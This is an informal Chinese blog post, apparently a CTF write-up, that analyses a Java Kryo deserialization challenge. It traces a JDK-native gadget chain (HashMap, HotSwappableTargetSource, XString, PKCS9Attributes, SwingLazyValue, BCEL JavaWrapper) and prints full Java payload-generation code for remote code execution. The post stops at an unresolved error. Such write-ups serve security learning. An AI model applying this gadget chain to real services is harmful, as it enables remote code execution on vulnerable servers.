---
layout: post
title: 西南赛区java
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: azeril.compu
---



```java
燕子，我终于来了，tnnd早就看上了这道题，然后学kryo复现coffee发现需要RASP，然后学RASP，学完学Hessian，然后才润来🤢，让燕子久等了
```

1. 提示：Hessian原生JDK利用
2. Kryo反序列化

## 老规矩自己 分析一波

```java
kryo 4.0.2  kryo序列化框架，需要对序列/反序列化的类进行注册，高版本还需有无参构造，默认FieldSerialize序列化方式
snakeyaml-1.26
asm-5.0.4
```

说好的hessian原生JDK，没hessian依赖呀。。。

先看给出的类，实质性就二个类，一个javabean、一个controller

```java
public class MessageController {
    @RequestMapping({"/"})
    @ResponseBody
    public Object message(String message) throws Exception {
        byte[] decodemsg;
        if (message == null) {
            decodemsg = Base64.getDecoder().decode("ASsBAQIDAWnkAQBqYXZhLnV0aWwuVVVJxAHLyYj656nh3Rj89bSK7ufJrcoDAXRpbWVzdGFt8AnMwumxjGIBAWNvbS5zZWEuVXNl8gEBMbABc2VhY2xvdWTz");
        } else {
            try {
                decodemsg = Base64.getDecoder().decode(message);
            } catch (Exception e) {
                decodemsg = Base64.getDecoder().decode("ASsBAQIDAWnkAQBqYXZhLnV0aWwuVVVJxAGBw5uOyvHs1sGsg/nqhOyP9pIDAXRpbWVzdGFt8AnmifmxjGIBAWNvbS5zZWEuVXNl8gEBMbABZXJyb/I=");
            }
        }
        return new CodecMessageConverter(new MessageCodec()).toMessage(decodemsg, null).getPayload();
    }
}
```

给的乱七八糟的，人家不都是直接给反序列化🐎，这里呃呃呃（麻烦的是一个接口套一个接口）

`但不是所有java题都是考链子的！！！`

![image-20231123200706815](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123200706815.png)

codec是我们传进去的new MessageCodec()，这里 this.codec.decode(字节码，object类)

![image-20231123201114783](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123201114783.png)

![image-20231123201222356](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123201222356.png)

然后继续跟进decode中

![image-20231123201248345](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123201248345.png)

![image-20231123201255921](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123201255921.png)

自己跟进去找到的，应该不是巧合叭，如果是巧合我真的######了

上面其实不用调试，肯定是直接到readobject了，接下来就是找链子了：

斯好tm熟悉啊，这里hashmap无疑了，上一道题用的是rome+signObject二次反序列化搞得，可是这道题没有rome依赖难搞

![image-20231123201601071](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123201601071.png)

### 斯看了看这几天的笔记，以及Dubbo那个CVE

```java
getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
write:-1, ASMSerializer_1_TemplatesImpl (com.alibaba.fastjson.serializer)
write:270, MapSerializer (com.alibaba.fastjson.serializer)
write:44, MapSerializer (com.alibaba.fastjson.serializer)
write:280, JSONSerializer (com.alibaba.fastjson.serializer)
toJSONString:863, JSON (com.alibaba.fastjson)
toString:857, JSON (com.alibaba.fastjson)
    //上面是需要fastjson依赖的
    
    //下面是我有的链子
equals:392, XString (com.sun.org.apache.xpath.internal.objects)
equals:104, HotSwappableTargetSource (org.springframework.aop.target)
putVal:635, HashMap (java.util)
put:612, HashMap (java.util)
read:162, MapSerializer (com.esotericsoftware.kryo.serializers)
read:39, MapSerializer (com.esotericsoftware.kryo.serializers)
readClassAndObject:813, Kryo (com.esotericsoftware.kryo)
readObject:136, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
readObject:147, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
decode:116, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
```

所以我们当前的问题就是如何找到某一个类的#toString方法然后命令执行

既然提到了hessian原生jdk而没有依赖，八成是用到了其中的链子，我在调试hessian链子的时候也发现很多类不需要第三方库的依赖

(`hessian`专有的包是com.cacho，toString我的天直接搬迁)

```java
runMain:131, JavaWrapper (com.sun.org.apache.bcel.internal.util)
_main:153, JavaWrapper (com.sun.org.apache.bcel.internal.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
createValue:73, SwingLazyValue (sun.swing)
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
getAttribute:265, PKCS9Attributes (sun.security.pkcs)
toString:334, PKCS9Attributes (sun.security.pkcs)

valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
expect:2880, Hessian2Input (com.caucho.hessian.io)
readString:1398, Hessian2Input (com.caucho.hessian.io)
readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io)
readObject:2122, Hessian2Input (com.caucho.hessian.io)
```

进行拼接一下

```java
runMain:131, JavaWrapper (com.sun.org.apache.bcel.internal.util)
_main:153, JavaWrapper (com.sun.org.apache.bcel.internal.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
createValue:73, SwingLazyValue (sun.swing)
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
getAttribute:265, PKCS9Attributes (sun.security.pkcs)
toString:334, PKCS9Attributes (sun.security.pkcs)
 
equals:392, XString (com.sun.org.apache.xpath.internal.objects)
equals:104, HotSwappableTargetSource (org.springframework.aop.target)
putVal:635, HashMap (java.util)
put:612, HashMap (java.util)
read:162, MapSerializer (com.esotericsoftware.kryo.serializers)
read:39, MapSerializer (com.esotericsoftware.kryo.serializers)
readClassAndObject:813, Kryo (com.esotericsoftware.kryo)
readObject:136, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
readObject:147, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
decode:116, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
```

果然是这样好完

![image-20231123205017944](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123205017944.png)

```java
思考了一个东西：上次因为是kryo5.2版本，所以需要修改注册等等，但这道题是4.2版本，默认是false所以不需要更改，想了半天咋绕过纯脑瘫😡😡😡😡
```

就是构造链子

```java
equals:392, XString (com.sun.org.apache.xpath.internal.objects)
equals:104, HotSwappableTargetSource (org.springframework.aop.target)
putVal:635, HashMap (java.util)
put:612, HashMap (java.util)
read:162, MapSerializer (com.esotericsoftware.kryo.serializers)
read:39, MapSerializer (com.esotericsoftware.kryo.serializers)
    readClassAndObject:813, Kryo (com.esotericsoftware.kryo)
readObject:136, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
readObject:147, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
decode:116, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
```

#### HotSwappableTargetSource.java

```java
  public boolean equals(Object other) {
        return this == other || other instanceof HotSwappableTargetSource && this.target.equals(((HotSwappableTargetSource)other).target);
    }
//目的很明确，target为Xstring，反射赋值即可   但是！！！
 other instanceof HotSwappableTargetSource 必须符合这个为true，才能执行后面的equals呀
 other需要是HotSwappableTargetSource类型，下面Xstring.equals()的参数就是other的target属性
```

吼吼吼不愧是我哈哈哈哈

```java
package com.sea;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;
import sun.reflect.ReflectionFactory;
import sun.security.pkcs.PKCS9Attribute;
import sun.security.pkcs.PKCS9Attributes;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;

public class payload {
    public static void main(String[] args) throws Exception {
        PKCS9Attributes s = createWithoutConstructor(PKCS9Attributes.class);
        UIDefaults uiDefaults = new UIDefaults();
        JavaClass evil = Repository.lookupClass(test.class);
        String payload = "$$BCEL$$" + Utility.encode(evil.getBytes(), true);

        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{payload}}));

        setFieldValue(s,"attributes",uiDefaults);
        //s是最后的toString
        XString xstring=new XString("a");
//        xstring.equals(s);
        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource("aa");
        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource("aa");
        setFieldValue(hotSwappableTargetSource1,"target",xstring);
        setFieldValue(hotSwappableTargetSource2,"target",s);
        hotSwappableTargetSource1.equals(hotSwappableTargetSource2);
//        com.sun.org.apache.xpath.internal.objects.XString
//
//
//        equals:392, XString (com.sun.org.apache.xpath.internal.objects)
    }

    public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }

    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

![image-20231123210904016](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123210904016.png)

接下来只需要让hashmap调用到就行了，然后反序列化调试通即可（`可是hashmap又又又忘了逻辑了，这里先试试`)

```java
final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
                   boolean evict) {
        Node<K,V>[] tab; Node<K,V> p; int n, i;
        if ((tab = table) == null || (n = tab.length) == 0)
            n = (tab = resize()).length;
        if ((p = tab[i = (n - 1) & hash]) == null)
            tab[i] = newNode(hash, key, value, null);
        else {
            Node<K,V> e; K k;
            //p是上一个的hash，
            if (p.hash == hash &&
                ((k = p.key) == key || (key != null && key.equals(k))))
                e = p;
```

每次都被卡这里服啦，（这次一定要写一个一劳永逸的脚本）

![image-20231123212032448](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123212032448.png)

​	这个报错给我干蒙蔽了（奇怪的是序列化竟然可以弹计算器）

![image-20231123214546203](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123214546203.png)





![image-20231123215152139](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123215152139.png)

key  

```java
   HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("aa","2");
        map1.put("bB","1");
        map2.put("aa","1");
        map2.put("bB","2");
        HashMap map = new HashMap();
        map.put(map1,"");
        map.put(map2,"");


```

```java
好好好，没想到卡在这一步服了 明天搞定你tnnd，再写一个自动化脚本
```

#### hashmap#readobject进行分析

执行key.equals(k)的前置条件是，p.hash==hash，hash就是计算key键值的hashcode值，如果key的对象重写了hashcode就会执行重写的否则就是普通的hashcode，然后就会执行equals方法，也是 当前key .equals(上一个key)

![image-20231124142424406](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231124142424406.png)

还是这个报错我就不理解了呀

![image-20231124143533163](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231124143533163.png)









